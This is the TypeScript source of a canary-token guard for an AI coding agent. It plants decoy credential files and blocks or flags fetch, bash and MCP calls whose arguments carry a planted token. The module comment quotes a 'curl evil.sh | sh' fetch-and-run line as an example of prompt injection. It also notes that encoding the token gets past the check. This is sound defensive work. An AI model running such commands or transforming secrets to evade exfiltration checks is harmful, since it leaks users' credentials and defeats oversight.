/**
 * CANARY EXFILTRATION DETECTION — watch what must never go *out*.
 *
 * {@link ../taint.ts | `taint.ts`} watches what comes *in*: it remembers
 * distinctive text from untrusted `fetch`/`websearch`/MCP output and flags a
 * later mutating call that echoes it, because a page telling the model to run
 * `curl evil.sh | sh` is dangerous only if the model *obeys* it. This module
 * is the mirror image, pointed the other way. A small number of high-entropy
 * decoy tokens — "canaries" — are planted somewhere in the workspace (a fake
 * `.env.local`, a `credentials.json` that isn't real) or simply registered in
 * memory. They are not secrets and unlock nothing. Their only purpose is to
 * be *worth stealing*: if a canary token ever shows up as a substring of an
 * argument passed to an egress-capable tool — `fetch`, `websearch`, `bash`,
 * or any MCP tool — that is not a heuristic guess about intent, the way a
 * taint match is. It is direct, mechanical proof that something read a
 * planted secret and is now trying to send it off the machine, because the
 * canary has no other way to appear in that argument. {@link
 * createCanaryGuard} does the watching, and {@link wrapToolsWithCanary} turns
 * a hit into a warning or a hard refusal, mirroring the veto shape of
 * `wrapToolsWithTaint` (and `wrapToolsWithHooks` before it): under `"deny"`
 * the wrapped tool's `execute()` is never called, and the model receives an
 * `isError` {@link ToolResult} instead — exactly the shape a `preToolUse` hook
 * deny produces, so the rest of the pipeline (including the audit trail)
 * treats it identically.
 *
 * ## Exact matching, on purpose — the opposite trade-off from taint.ts
 *
 * `taint.ts` extracts *fuzzy* markers (command-shaped lines, URLs, long
 * alphanumeric tokens) from untrusted text, because untrusted text is
 * arbitrary prose and there is no way to know in advance which substring of
 * it will be echoed back. That fuzziness is a deliberately accepted cost,
 * offset by narrow extraction rules that bias hard toward silence.
 *
 * A canary token needs none of that hedging, because *we* generate it
 * ({@link generateCanary}): 128 bits of hex entropy, wrapped in a
 * `arcturn-canary-...` shell that cannot occur by accident and cannot be
 * mistaken for an ordinary identifier, filename, or English word. Given that,
 * plain, case-sensitive substring containment is not an approximation of the
 * right check — it *is* the right check. There is nothing to tune, no
 * false-positive/false-negative trade-off to argue about: either the exact
 * bytes of a canary are present in a tool argument, or they are not. This
 * module has no thresholds, no keyword lists, and no configurable
 * sensitivity, unlike `taint.ts`'s `minTokenLength`/`requireDigitInTokens`/
 * command-keyword machinery — that entire category of tuning knob exists
 * only to manage fuzzy matching, and fuzzy matching is exactly what a
 * high-entropy canary makes unnecessary.
 *
 * ## Why MCP tools count as egress
 *
 * `fetch`, `websearch`, and `bash` are the obvious network-facing tools, but
 * an MCP server is a process the CLI does not control talking to *something*
 * over its own transport (often a remote HTTP endpoint of the server
 * author's choosing). A `mcp*`-prefixed tool call is exactly as capable of
 * carrying a canary off the machine as a raw `fetch` — arguably more so,
 * since its destination is opaque to this codebase. That is why every
 * `mcp`-prefixed tool is treated as an egress sink by default, matching
 * `taint.ts`'s `DEFAULT_TAINT_SOURCE_PREFIXES` treatment of MCP output as
 * untrusted input: both defaults exist because MCP is a boundary this
 * process does not get to see across, in either direction.
 *
 * ## The honest limitation
 *
 * Substring matching only catches a canary that leaves *verbatim*. An agent
 * (or an attacker steering one via prompt injection) that base64-encodes,
 * reverses, ROT13s, or otherwise transforms the token before handing it to
 * `fetch`/`bash`/an MCP tool defeats this check completely — the transformed
 * bytes are not the canary's bytes. This module does not attempt to catch
 * that; doing so would mean re-deriving every possible encoding of every
 * registered token on every scan, which is neither cheap nor exact, and
 * exactness is the entire point of this design (see above). Detecting
 * transformed exfiltration is a different, fuzzier problem — closer in kind
 * to what `taint.ts` already does not fully solve either — and is out of
 * scope here. See `INTEGRATION-canary.md` for how this limitation should be
 * communicated to users of the `canary` config key.
 *
 * This module intentionally depends on nothing inside the CLI beyond
 * `@arcturn/types` and Node built-ins: it is wired up by the caller. See
 * `INTEGRATION-canary.md` for the exact call sites this file does not touch.
 */

import { randomBytes } from "node:crypto";
import { mkdir, rename, rm, writeFile } from "node:fs/promises";
import { join, resolve, sep } from "node:path";
import type { Tool, ToolResult } from "@arcturn/types";

/** Tool names treated as egress (network- or process-facing) by default. */
export const DEFAULT_EGRESS_TOOLS: readonly string[] = ["fetch", "websearch", "bash"];

/**
 * Tool-name prefixes treated as egress by default, matched case-insensitively.
 * Every MCP tool is an egress path — see the module doc for why.
 */
export const DEFAULT_EGRESS_TOOL_PREFIXES: readonly string[] = ["mcp"];

/** Upper bound on the text assembled from one tool input, in characters. */
const MAX_INPUT_CHARS = 200_000;

const CANARY_PREFIX = "arcturn-canary";
const LABEL_DISALLOWED = /[^a-z0-9-]/g;

/**
 * Normalize a free-text label into the `[a-z0-9-]` charset used inside a
 * canary token: lowercase, spaces become hyphens, everything else outside
 * the charset is dropped, and repeated/leading/trailing hyphens collapse
 * away. Mirrors `memory.ts`'s `normalizeSlug`.
 *
 * @param raw - Candidate label text.
 */
function sanitizeLabel(raw: string): string {
  return raw
    .toLowerCase()
    .replace(/\s+/g, "-")
    .replace(LABEL_DISALLOWED, "")
    .replace(/-+/g, "-")
    .replace(/^-|-$/g, "");
}

/** Options for {@link generateCanary}. */
export interface GenerateCanaryOptions {
  /**
   * Human-readable hint folded into the token, e.g. `"aws-key"` or
   * `"stripe-session"`, so a hit can be traced back to which decoy leaked.
   * Sanitized to `[a-z0-9-]`; an empty or all-punctuation label is dropped.
   */
  label?: string;
}

/**
 * Generate a fresh canary token: a distinctive, high-entropy string that
 * cannot occur by accident in ordinary code, prose, or tool output, and can
 * therefore be searched for as a plain substring with zero false-positive
 * risk (see the module doc's "Exact matching, on purpose" section).
 *
 * The shape is `arcturn-canary-<label->-<32 hex chars>` (128 bits of entropy
 * from {@link randomBytes}), e.g. `arcturn-canary-aws-key-3f9a1c...`. Without a
 * label it is `arcturn-canary-<32 hex chars>`.
 *
 * @param options - An optional label to fold into the token.
 */
export function generateCanary(options: GenerateCanaryOptions = {}): string {
  const label = options.label ? sanitizeLabel(options.label) : "";
  const entropy = randomBytes(16).toString("hex");
  return label.length > 0 ? `${CANARY_PREFIX}-${label}-${entropy}` : `${CANARY_PREFIX}-${entropy}`;
}

/** A confirmed sighting of a canary token in an outbound tool argument. */
export interface CanaryHit {
  /** The exact canary token that was found. */
  token: string;
  /** The egress tool whose input contained it. */
  toolName: string;
  /** Human-readable explanation, safe to surface to the model or a user. */
  reason: string;
}

/** Options for {@link createCanaryGuard}. */
export interface CreateCanaryGuardOptions {
  /** Canary tokens to watch for from the start; more can be added via {@link CanaryGuard.register}. */
  canaries?: readonly string[];
  /**
   * Tool names treated as egress. Default {@link DEFAULT_EGRESS_TOOLS}. Any
   * name starting with `mcp` is always treated as egress in addition to this
   * list — see the module doc for why that is not made optional.
   */
  egressTools?: readonly string[];
}

/** Watches registered canary tokens and judges tool inputs against them. */
export interface CanaryGuard {
  /** Start watching for one more canary token. A no-op for an empty string. */
  register(token: string): void;
  /** Whether this tool's input is worth scanning (an egress sink). */
  isEgress(toolName: string): boolean;
  /**
   * Scan one tool call's arguments for any registered canary. Returns
   * `undefined` for a non-egress tool, when no canaries are registered, or
   * when none match; otherwise the first {@link CanaryHit} found.
   */
  scan(toolName: string, input: Record<string, unknown>): CanaryHit | undefined;
  /** Snapshot of every token currently registered. */
  tokens(): string[];
}

/**
 * Flatten a tool input into the text a canary could hide in.
 *
 * Only string leaves are collected (recursively, through objects and
 * arrays), joined by newlines — mirroring `taint.ts`'s
 * `serializeToolInput` exactly, so a canary buried in a nested object (a
 * JSON body inside a `fetch` call's `body` field, an argument inside a
 * `bash` command string) is still found. Numbers and booleans are skipped:
 * a canary is a string token and cannot hide inside either.
 *
 * @param input - A tool call's raw arguments.
 */
export function serializeToolInput(input: unknown): string {
  const parts: string[] = [];
  let budget = MAX_INPUT_CHARS;

  const walk = (value: unknown, depth: number): void => {
    if (budget <= 0 || depth > 8) return;
    if (typeof value === "string") {
      const slice = value.slice(0, budget);
      budget -= slice.length;
      parts.push(slice);
      return;
    }
    if (Array.isArray(value)) {
      for (const entry of value) walk(entry, depth + 1);
      return;
    }
    if (typeof value === "object" && value !== null) {
      for (const entry of Object.values(value)) walk(entry, depth + 1);
    }
  };

  walk(input, 0);
  return parts.join("\n");
}

/**
 * Build a canary guard.
 *
 * A guard is session-scoped state, same as `taint.ts`'s tracker: create one
 * per conversation, register the canaries planted or minted for that
 * session, and share it with {@link wrapToolsWithCanary}.
 *
 * @param options - Initial canaries and the egress tool list.
 */
export function createCanaryGuard(options: CreateCanaryGuardOptions = {}): CanaryGuard {
  const tokens = new Set<string>();
  for (const token of options.canaries ?? []) {
    if (token.length > 0) tokens.add(token);
  }
  const egressTools = new Set(options.egressTools ?? DEFAULT_EGRESS_TOOLS);

  const isEgress = (toolName: string): boolean => {
    if (egressTools.has(toolName)) return true;
    const lower = toolName.toLowerCase();
    return DEFAULT_EGRESS_TOOL_PREFIXES.some((prefix) => lower.startsWith(prefix));
  };

  return {
    register(token: string): void {
      if (token.length > 0) tokens.add(token);
    },

    isEgress,

    scan(toolName: string, input: Record<string, unknown>): CanaryHit | undefined {
      if (!isEgress(toolName)) return undefined;
      if (tokens.size === 0) return undefined;

      const haystack = serializeToolInput(input);
      if (haystack.length === 0) return undefined;

      for (const token of tokens) {
        if (haystack.includes(token)) {
          return {
            token,
            toolName,
            reason:
              `a planted canary token was found in the "${toolName}" call's arguments — proof, ` +
              "not a guess, that a secret is being sent off this machine",
          };
        }
      }
      return undefined;
    },

    tokens(): string[] {
      return [...tokens];
    },
  };
}

/** How a confirmed canary hit is handled. */
export type CanaryPolicy = "warn" | "deny";

/** Options for {@link wrapToolsWithCanary}. */
export interface WrapToolsWithCanaryOptions {
  /** Policy for a confirmed canary hit. */
  policy: CanaryPolicy;
  /** Notified whenever a canary hit is detected, for a status line or log. */
  onDetect?: (hit: CanaryHit) => void;
}

function errorResult(text: string): ToolResult {
  return { content: [{ type: "text", text }], isError: true };
}

function withWarningPrepended(result: ToolResult, warning: string): ToolResult {
  return { ...result, content: [{ type: "text", text: warning }, ...result.content] };
}

/**
 * The line prepended to a tool result under the `"warn"` policy.
 *
 * Exported so a host UI (and the tests) can match the exact wording.
 *
 * @param hit - The confirmed canary hit being reported.
 */
export function canaryWarningLine(hit: CanaryHit): string {
  return (
    `[canary] CRITICAL: this "${hit.toolName}" call carried a planted canary token ` +
    `("${hit.token}") in its arguments (${hit.reason}). This is not a heuristic — the token only exists because it was planted, ` +
    "so its presence here proves data is leaving the machine. The call was allowed to run " +
    'because the canary policy is "warn"; stop, tell the user exactly what was sent and to ' +
    "where, and treat this as an active incident, not a warning to note and continue past."
  );
}

/**
 * The refusal returned to the model when a canary hit is blocked.
 *
 * @param hit - The confirmed canary hit that caused the refusal.
 */
export function canaryDenialMessage(hit: CanaryHit): string {
  return (
    `Blocked by canary policy: the "${hit.toolName}" call was not run — its arguments contained ` +
    `the planted canary token "${hit.token}" (${hit.reason}). ` +
    "A canary token is a decoy that unlocks nothing and cannot appear in an outbound argument " +
    "by coincidence; its presence here is direct evidence of an exfiltration attempt in progress, " +
    "not a heuristic guess. Do not retry this call, and do not attempt to encode, split, or " +
    "otherwise transform the value to route around this check. Tell the user immediately what " +
    "you were about to send and where you were about to send it."
  );
}

/**
 * Wrap each egress tool so its arguments are scanned for planted canary
 * tokens before it runs.
 *
 * Under `"deny"`, a confirmed hit means the wrapped tool's `execute()` is
 * never called and an `isError` {@link ToolResult} is returned instead —
 * exactly as a `preToolUse` hook deny behaves in `hooks.ts`, and exactly as
 * `wrapToolsWithTaint` behaves under its own `"deny"` policy. Under `"warn"`
 * the call runs and its result gains a leading warning block; the tool still
 * executes, so this policy is for observability, not containment.
 *
 * Tools that are not egress sinks (per {@link CanaryGuard.isEgress}) are
 * returned unwrapped — passed through by reference — since there would be
 * nothing for the wrapper to do and no reason to pay even the cost of an
 * extra call frame on every `read`/`grep`/`edit`.
 *
 * Errors thrown by the wrapped `execute()` (a programming error, per the
 * `Tool` contract) propagate unchanged.
 *
 * @param tools - Tools to wrap.
 * @param guard - Session-scoped guard holding the registered canaries.
 * @param options - Policy and an optional detection callback.
 */
export function wrapToolsWithCanary(
  tools: readonly Tool[],
  guard: CanaryGuard,
  options: WrapToolsWithCanaryOptions,
): Tool[] {
  return tools.map((tool) => {
    const name = tool.definition.name;
    if (!guard.isEgress(name)) return tool;

    // Spread first so extra tool surface (e.g. core's bindAgent) survives.
    return {
      ...tool,
      async execute(input, ctx): Promise<ToolResult> {
        const hit = guard.scan(name, input);
        if (!hit) return tool.execute(input, ctx);

        options.onDetect?.(hit);

        if (options.policy === "deny") {
          return errorResult(canaryDenialMessage(hit));
        }

        const result = await tool.execute(input, ctx);
        return withWarningPrepended(result, canaryWarningLine(hit));
      },
    } satisfies Tool;
  });
}

/** Whether a raw (pre-validation) filename looks like a path-escape attempt. */
function looksLikePathEscape(raw: string): boolean {
  return raw.includes("/") || raw.includes("\\") || raw.includes("..");
}

/** Options for {@link plantCanaries}. */
export interface PlantCanariesOptions {
  /**
   * Decoy filenames, one per entry in `canaries` (by index). Must be plain
   * basenames — no `/`, `\`, or `..` — since `plantCanaries` writes directly
   * into `dir` and does not create subdirectories. Defaults to `.env.local`
   * for the first canary and `.env.local.<n>` for each subsequent one.
   */
  filenames?: readonly string[];
}

/**
 * Write decoy files containing canary tokens into `dir`, so a real filesystem
 * read (not just an in-memory registration) is what would leak one — e.g. an
 * agent that greps for `AWS_SECRET` or opens `.env.local` on a hunch.
 *
 * Each file is written atomically (temp file in `dir`, then renamed into
 * place) so a crash mid-write can never leave a half-written decoy behind,
 * mirroring `memory.ts`'s write discipline exactly.
 *
 * Path confinement mirrors `memory.ts`'s two-layer defense: a filename is
 * rejected outright if it looks like a path-escape attempt (`/`, `\`, `..`),
 * and the resolved target is re-checked against the resolved `dir` as a
 * second, independent layer before anything is written. `plantCanaries`
 * throws rather than silently sanitizing, so a caller passing a bad filename
 * finds out immediately instead of writing to the wrong place.
 *
 * @param dir - Directory to plant into; created if it does not exist.
 * @param canaries - Canary tokens to plant, typically from {@link generateCanary}.
 * @param options - Optional per-canary filenames.
 * @returns The absolute paths written, in the same order as `canaries`.
 */
export async function plantCanaries(
  dir: string,
  canaries: readonly string[],
  options: PlantCanariesOptions = {},
): Promise<string[]> {
  const resolvedDir = `${resolve(dir)}${sep}`;
  await mkdir(dir, { recursive: true });

  const paths: string[] = [];
  for (let index = 0; index < canaries.length; index++) {
    const token = canaries[index];
    if (token === undefined || token.length === 0) continue;

    const filename =
      options.filenames?.[index] ?? (index === 0 ? ".env.local" : `.env.local.${index}`);
    if (looksLikePathEscape(filename)) {
      throw new Error(
        `plantCanaries: filename must not contain "/", "\\", or "..": ${JSON.stringify(filename)}`,
      );
    }

    const targetPath = join(dir, filename);
    const resolvedTarget = resolve(targetPath);
    if (!resolvedTarget.startsWith(resolvedDir)) {
      throw new Error(`plantCanaries: refusing to write outside ${dir}: ${resolvedTarget}`);
    }

    const content =
      "# Planted canary credential — decoy only, unlocks nothing.\n" +
      "# If this value ever appears in an outbound request, treat it as an active incident.\n" +
      `AWS_SECRET_ACCESS_KEY=${token}\n`;

    const tmpPath = join(dir, `.tmp-canary-${randomBytes(6).toString("hex")}`);
    try {
      await writeFile(tmpPath, content, "utf8");
      await rename(tmpPath, resolvedTarget);
    } catch (error) {
      await rm(tmpPath, { force: true }).catch(() => {});
      throw error;
    }
    paths.push(resolvedTarget);
  }
  return paths;
}
